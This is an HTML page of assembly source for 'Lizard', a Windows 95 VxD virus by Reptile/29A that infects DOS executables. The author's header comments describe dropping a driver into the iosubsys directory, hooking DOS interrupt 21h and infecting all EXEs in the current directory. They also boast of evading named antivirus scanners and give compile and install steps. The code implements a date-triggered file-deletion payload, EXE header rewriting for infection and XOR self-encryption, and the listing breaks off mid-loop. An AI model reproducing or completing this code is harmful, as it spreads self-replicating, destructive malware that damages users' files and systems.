<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Lizard.1967 - lzd.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Lizard by Reptile/29A (another version ;)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;                          млллллм млллллм млллллм</span><span class="sc0">
</span><span class="sc1">;                          ллл ллл ллл ллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                           мммллп плллллл ллллллл</span><span class="sc0">
</span><span class="sc1">;                          лллмммм ммммллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                          ллллллл ллллллп ллл ллл</span><span class="sc0">

</span><span class="sc1">;This is an encrypted vxd direct action dos exe infector (I added some anti-</span><span class="sc0">
</span><span class="sc1">;heuristics and other stuff and optimized the code of v1.0).</span><span class="sc0">

</span><span class="sc1">;When an infected file is run the virus decrypts itself, drops lzd.vxd to the</span><span class="sc0">
</span><span class="sc1">;available one of the three dirs and then returns back to the host. After the</span><span class="sc0">
</span><span class="sc1">;next reboot...</span><span class="sc0">

</span><span class="sc1">;When windoze 95 is starting, it loads the vxd (lzd.vxd) automatically coz</span><span class="sc0">
</span><span class="sc1">;it's in the '\iosubsys\' dir (Lizard doesn't need to modify the system.ini</span><span class="sc0">
</span><span class="sc1">;or the registry). Then the virus takes control and hooks the V86 interrupt</span><span class="sc0">
</span><span class="sc1">;chain. It executes on exec (4bh), create (3ch), ext. open (6ch), close (3eh)</span><span class="sc0">
</span><span class="sc1">;and on find first file (4eh) using direct action techniques to infect all</span><span class="sc0">
</span><span class="sc1">;dos exes in the current directory (*highly* infectious!). Lzd.vxd has a size</span><span class="sc0">
</span><span class="sc1">;of 7099 bytes (masm sux! :P ), but the victims are only increased by 1967 (!)</span><span class="sc0">
</span><span class="sc1">;bytes.</span><span class="sc0">

</span><span class="sc1">;Findvirus v7.75, AVP v3.0 and TBAV v8.03 (high heuristic sensitivity!) can't</span><span class="sc0">
</span><span class="sc1">;detect it (all for win95).</span><span class="sc0">

</span><span class="sc1">;Compiling lzd.vxd (win95 DDK):</span><span class="sc0">
</span><span class="sc1">;makefile</span><span class="sc0">

</span><span class="sc1">;Compiling rmlzd.inc:</span><span class="sc0">
</span><span class="sc1">;tasm /m2 rmlzd.asm</span><span class="sc0">
</span><span class="sc1">;tlink /t rmlzd.obj</span><span class="sc0">
</span><span class="sc1">;file2db rmlzd.com (or another db generator)</span><span class="sc0">
</span><span class="sc1">;modify rmlzd.dat</span><span class="sc0">

</span><span class="sc1">;To install copy lzd.vxd to one of the following dirs:</span><span class="sc0">
</span><span class="sc1">;- c:\windows\system\iosubsys</span><span class="sc0">
</span><span class="sc1">;- c:\win95\system\iosubsys</span><span class="sc0">
</span><span class="sc1">;- c:\windows.000\system\iosubsys</span><span class="sc0">
</span><span class="sc1">;...or start lizard.exe :)</span><span class="sc0">

</span><span class="sc1">;P.S.:</span><span class="sc0">
</span><span class="sc1">;Sandy: are u lucky now? ;)</span><span class="sc0">
</span><span class="sc1">;Jacky: thanx for testing it!</span><span class="sc0">
</span><span class="sc1">;GriYo: the stack stuff really didn't work :P</span><span class="sc0">

</span><span class="sc1">;P.P.S:</span><span class="sc0">
</span><span class="sc1">;TrY MaGiC MuShRoOmS...</span><span class="sc0">

</span><span class="sc1">;---[LZD.ASM]-----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">

</span><span class="sc9">.xlist</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">vmm.inc</span><span class="sc0">
</span><span class="sc9">.list</span><span class="sc0">

</span><span class="sc5">vxdhsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">701</span><span class="sc0">
</span><span class="sc5">vxddsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">81</span><span class="sc0">
</span><span class="sc5">vxdcsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">880</span><span class="sc0">
</span><span class="sc5">esize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">encend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">encstart</span><span class="sc0">
</span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc5">Declare_Virtual_Device</span><span class="sc0"> </span><span class="sc5">LZD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LZD_Control</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined_Device_Id</span><span class="sc4">,</span><span class="sc0"> \
</span><span class="sc5">Undefined_Init_Order</span><span class="sc4">,,</span><span class="sc0"> 

</span><span class="sc5">VxD_Locked_Data_Seg</span><span class="sc0">
</span><span class="sc5">wcard</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.e?e'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;*.l?z</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rmlzd.inc</span><span class="sc0">    </span><span class="sc1">;realmode code</span><span class="sc0">
</span><span class="sc5">dflag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pflag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">VxD_Locked_Data_Ends</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">VxD_Locked_Code_Seg</span><span class="sc0">
</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">LZD_Device_Init</span><span class="sc0">
</span><span class="sc1">;trigger</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">  </span><span class="sc1">;get date</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;live drazil si</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">   </span><span class="sc1">;26.10.?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">npload</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">npload</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pflag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;hehe</span><span class="sc0">

</span><span class="sc5">npload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">;install int 21h handler</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Hook_V86_Int_Chain</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">LZD_Device_Init</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AH</span><span class="sc4">],</span><span class="sc2">4bh</span><span class="sc0">   </span><span class="sc1">;exec </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AH</span><span class="sc4">],</span><span class="sc2">3ch</span><span class="sc0">   </span><span class="sc1">;create </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AH</span><span class="sc4">],</span><span class="sc2">6ch</span><span class="sc0">   </span><span class="sc1">;ext. open </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AH</span><span class="sc4">],</span><span class="sc2">3eh</span><span class="sc0">   </span><span class="sc1">;close </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AH</span><span class="sc4">],</span><span class="sc2">4eh</span><span class="sc0">   </span><span class="sc1">;find first </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ww</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">prevhook</span><span class="sc0">

</span><span class="sc5">ww</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Push_Client_State</span><span class="sc0">   </span><span class="sc1">;save regs          </span><span class="sc0">
</span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Begin_Nest_Exec</span><span class="sc0">    
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dflag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">   </span><span class="sc1">;open lzd.vxd</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dropname1</span><span class="sc0">   </span><span class="sc1">;in the 'c:\windows\system\iosubsys' dir</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">   </span><span class="sc1">;open the vxd</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dropname2</span><span class="sc0">   </span><span class="sc1">;in the 'c:\win95\system\iosubsys' dir</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">   </span><span class="sc1">;open the vxd</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dropname3</span><span class="sc0">   </span><span class="sc1">;in the 'c:\windows.000\system\iosubsys' dir</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ecsit</span><span class="sc0">  </span><span class="sc1">;skip it</span><span class="sc0">

</span><span class="sc5">rd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">  </span><span class="sc1">;store the header of the vxd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vxdhsize</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vxdheader</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">    </span><span class="sc1">;jmp over zeros</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3400</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">  </span><span class="sc1">;store the vxddata</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vxddsize</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vxddata</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">    </span><span class="sc1">;jmp over realmodecode and zeros</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2037</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">  </span><span class="sc1">;store the vxdcode</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vxdcsize</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vxdcode</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">  </span><span class="sc1">;close...   </span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dflag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;set flag</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">  </span><span class="sc1">;set dta</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ndta</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">ffirst</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">  </span><span class="sc1">;search for first exe</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">w</span><span class="sc0">
</span><span class="sc5">fnext</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">  </span><span class="sc1">;find next exe</span><span class="sc0">
</span><span class="sc5">w</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">wcard</span><span class="sc0">   </span><span class="sc1">;*.e?e</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ecsit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">    </span><span class="sc1">;set normal attribute</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">pflag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;sux0ring microsuckers</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pheeew</span><span class="sc0">  </span><span class="sc1">;(the payload in v1.0 was a bit too destructive ;)</span><span class="sc0">

</span><span class="sc5">evil</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;evil payload against the imperialism of microsoft! </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">  </span><span class="sc1">;yhcrana</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ecsit</span><span class="sc0">

</span><span class="sc5">pheeew</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">   </span><span class="sc1">;open the victim</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fnext</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">   </span><span class="sc1">;read header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">;exe?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cfile</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0"> </span><span class="sc1">;allocate all mem?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cfile</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">;win exe?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cfile</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;infected?</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cfile</span><span class="sc0">

</span><span class="sc1">;save ss:sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sseg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ssp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;save cs:ip</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">csip</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">    </span><span class="sc1">;eof</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;calc new cs:ip</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vend</span><span class="sc0">    </span><span class="sc1">;calc stack</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">;xor encryption</span><span class="sc0">
</span><span class="sc5">rdnm</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rdnm</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encval</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;save random value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">encstart</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">esize</span><span class="sc0">
</span><span class="sc5">xl</span><span class="sc4">:</span><span class="sc0">
